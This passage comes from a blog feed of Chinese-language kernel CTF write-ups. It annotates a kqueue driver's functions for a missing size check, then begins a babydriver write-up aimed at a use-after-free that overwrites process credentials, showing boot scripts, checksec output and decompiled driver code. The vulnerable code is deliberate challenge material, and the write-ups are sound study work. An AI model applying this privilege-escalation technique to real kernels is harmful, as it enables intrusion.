    </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Populate next pointer of the previous entry */</span></span><br><span class=\"line\">        prev_entry-&gt;next = current_entry;\t\t\t\t\t<span class=\"comment\">//尾插法</span></span><br><span class=\"line\">        prev_entry = prev_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Find an appropriate slot in kqueues */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> j = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;MAX_QUEUES;j++)&#123;\t\t\t\t\t\t\t<span class=\"comment\">//所有的队列形成一个数组kqueues,定义在头文件里</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueues[j] == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//queue *kqueues[MAX_QUEUES] = &#123;(queue *)NULL&#125;;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(j&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class=\"line\">    kqueues[j] = <span class=\"built_in\">queue</span>;</span><br><span class=\"line\">    queueCount++;</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>整个创建新的 kqueue 的函数还是比较繁琐的，注释写道代码里</p>\n<p>大概就是，我们创建一个队列，整个队列包含所有的节点结构体，每个结构体的 data 指向一个新的堆块。然后把这个队列的头指针放入一个全局的数组。</p>\n<h3 id=\"delete_kqueue\"><a class=\"markdownIt-Anchor\" href=\"#delete_kqueue\">#</a> delete_kqueue</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">delete_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for existence of the request kqueue */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    kfree(<span class=\"built_in\">queue</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(<span class=\"built_in\">queue</span>,<span class=\"number\">0</span>,<span class=\"built_in\">queue</span>-&gt;queue_size);</span><br><span class=\"line\">    kqueues[request.queue_idx] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里会根据我们传入结构体的 queue_idx, 释放对应的 queue, 并且数据清空，不存在 uaf。</p>\n<h3 id=\"edit_kqueue\"><a class=\"markdownIt-Anchor\" href=\"#edit_kqueue\">#</a> edit_kqueue</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">edit_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if the kqueue exists at that idx */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue entry */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//根据idx进行定位，定位到节点，每个节点不会保留data的大小，</span></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the kqueue entry memory */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);<span class=\"comment\">//第一个头节点</span></span><br><span class=\"line\"><span class=\"comment\">//进行一个简单的遍历</span></span><br><span class=\"line\">    <span class=\"comment\">/* Check for the existence of the kqueue entry */</span></span><br><span class=\"line\">    exists = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;<span class=\"built_in\">queue</span>-&gt;max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">/* If kqueue entry found , do the necessary */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;<span class=\"comment\">//节点存在，data指针不为空，</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class=\"line\">                validate(<span class=\"built_in\">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));</span><br><span class=\"line\">                exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx==<span class=\"number\">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(<span class=\"built_in\">queue</span>-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));<span class=\"comment\">//memcpy返回的是queue-&gt;data</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exists)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> NOT_EXISTS;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>这里要注意下头部也是可以保存信息的，但是目前还未看到漏洞。</p>\n<h3 id=\"save_kqueue_entries\"><a class=\"markdownIt-Anchor\" href=\"#save_kqueue_entries\">#</a> save_kqueue_entries</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">save_kqueue_entries</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds queue_idx requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if queue is already saved or not */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(isSaved[request.queue_idx]==<span class=\"literal\">true</span>)\t\t\t\t<span class=\"comment\">//isSaved一个bool类型的数组</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Queue already saved&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate(kqueues[request.queue_idx]);\t<span class=\"comment\">//检查参数值是否为空的函数validate</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries &lt; <span class=\"number\">1</span> || request.max_entries &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate memory for the kqueue to be saved */</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *new_queue = validate((<span class=\"type\">char</span> *)kzalloc(<span class=\"built_in\">queue</span>-&gt;queue_size,GFP_KERNEL));<span class=\"comment\">//新开一个空间</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Each saved entry can have its own size */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size &gt; <span class=\"built_in\">queue</span>-&gt;queue_size)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(new_queue,<span class=\"built_in\">queue</span>-&gt;data,request.data_size));<span class=\"comment\">//没有检查size，</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">    new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the entries of the kqueue */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* copy all possible kqueue entries */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">            validate(<span class=\"built_in\">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">        new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Mark the queue as saved */</span></span><br><span class=\"line\">    isSaved[request.queue_idx] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "learning"
            ]
        },
        {
            "id": "http://example.com/2022/05/02/ciscn-babydriver/",
            "url": "http://example.com/2022/05/02/ciscn-babydriver/",
            "title": "ciscn_babydriver",
            "date_published": "2022-05-02T06:36:45.000Z",
            "content_html": "<h1 id=\"ciscn_babydriveruaf修改自身的cred\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_babydriveruaf修改自身的cred\">#</a> ciscn_babydriver\tuaf,\t修改自身的 cred</h1>\n<h2 id=\"保护检查\"><a class=\"markdownIt-Anchor\" href=\"#保护检查\">#</a> 保护检查：</h2>\n<h3 id=\"qemu\"><a class=\"markdownIt-Anchor\" href=\"#qemu\">#</a> qemu</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/babydriver$ <span class=\"built_in\">cat</span> boot.sh </span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">qemu-system-x86_64 -initrd fs.cpio -kernel bzImage -append <span class=\"string\">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>没有开启地址随机化以及隔离保护</p>\n<h3 id=\"驱动文件\"><a class=\"markdownIt-Anchor\" href=\"#驱动文件\">#</a> 驱动文件</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">mount -t proc none /proc</span><br><span class=\"line\">mount -t sysfs none /sys</span><br><span class=\"line\">mount -t devtmpfs devtmpfs /dev</span><br><span class=\"line\"><span class=\"built_in\">chown</span> root:root flag</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 400 flag</span><br><span class=\"line\"><span class=\"built_in\">exec</span> 0&lt;/dev/console</span><br><span class=\"line\"><span class=\"built_in\">exec</span> 1&gt;/dev/console</span><br><span class=\"line\"><span class=\"built_in\">exec</span> 2&gt;/dev/console</span><br><span class=\"line\"></span><br><span class=\"line\">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 777 /dev/babydev</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;\\nBoot took <span class=\"subst\">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\\n&quot;</span></span><br><span class=\"line\">setsid cttyhack setuidgid 1000 sh</span><br><span class=\"line\"></span><br><span class=\"line\">umount /proc</span><br><span class=\"line\">umount /sys</span><br><span class=\"line\">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>\n<p>在这里我们看到他的驱动的位置是在 /lib/modules/4.4.72/babydriver.ko</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/babydriver/lib/modules/4.4.72$ checksec babydriver.ko</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/babydriver/lib/modules/4.4.72/babydriver.ko&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>\n<h3 id=\"vmlinux\"><a class=\"markdownIt-Anchor\" href=\"#vmlinux\">#</a> vmlinux</h3>\n<p>我们提取出来 vmlinux 后，extract-vmlinux bzImage &gt; vmlinux</p>\n<p>进行检查，发现保护什么也没有开。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/kernel/babydriver$ checksec vmlinux</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/dreamcat/Desktop/kernel/babydriver/vmlinux&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    No RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0xffffffff81000000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"题目分析\"><a class=\"markdownIt-Anchor\" href=\"#题目分析\">#</a> 题目分析</h2>\n<p>这是一道堆题</p>\n<h3 id=\"init\"><a class=\"markdownIt-Anchor\" href=\"#init\">#</a> init</h3>\n<p>我们 open 设备的时候，会默认调用这个函数，这里初始化了一些参数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">babydriver_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// edx</span></span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// ebx</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">class</span> *<span class=\"title\">v5</span>;</span> <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class=\"number\">0LL</span>, <span class=\"number\">1LL</span>, <span class=\"string\">&quot;babydev&quot;</span>) &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class=\"line\">    v2 = babydev_no;</span><br><span class=\"line\">    cdev_0.owner = &amp;_this_module;</span><br><span class=\"line\">    v4 = cdev_add(&amp;cdev_0, babydev_no, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v5 = (class *)_class_create(&amp;_this_module, <span class=\"string\">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class=\"line\">      babydev_class = v5;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v5 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v7 = device_create(v5, <span class=\"number\">0LL</span>, babydev_no, <span class=\"number\">0LL</span>, <span class=\"string\">&quot;babydev&quot;</span>);</span><br><span class=\"line\">        v1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v7 )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> v1;</span><br><span class=\"line\">        printk(&amp;unk_351, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">        class_destroy(babydev_class);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        printk(&amp;unk_33B, <span class=\"string\">&quot;babydev&quot;</span>, v6);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      cdev_del(&amp;cdev_0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      printk(&amp;unk_327, v2, v3);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    unregister_chrdev_region(babydev_no, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> v4;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printk(&amp;unk_309, <span class=\"number\">0LL</span>, v0);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"exit\"><a class=\"markdownIt-Anchor\" href=\"#exit\">#</a> exit</h3>\n<p>同理，我们关闭设备的后会调用这个函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __cdecl <span class=\"title function_\">babydriver_exit</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  device_destroy(babydev_class, babydev_no);</span><br><span class=\"line\">  class_destroy(babydev_class);</span><br><span class=\"line\">  cdev_del(&amp;cdev_0);</span><br><span class=\"line\">  unregister_chrdev_region(babydev_no, <span class=\"number\">1LL</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"babyopen\"><a class=\"markdownIt-Anchor\" href=\"#babyopen\">#</a> babyopen</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">babyopen</span><span class=\"params\">(inode *inode, file *filp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// rdx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _fentry__(inode, filp);</span><br><span class=\"line\">  babydev_struct.device_buf = (<span class=\"type\">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class=\"number\">6</span>], <span class=\"number\">37748928LL</span>, <span class=\"number\">64LL</span>);</span><br><span class=\"line\">  babydev_struct.device_buf_len = <span class=\"number\">64LL</span>;</span><br><span class=\"line\">  printk(<span class=\"string\">&quot;device open\\n&quot;</span>, <span class=\"number\">37748928LL</span>, v2);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>申请了一个 buf 空间，大小为 0x40</p>\n<h3 id=\"babyrelease\"><a class=\"markdownIt-Anchor\" href=\"#babyrelease\">#</a> babyrelease</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">babyrelease</span><span class=\"params\">(inode *inode, file *filp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// 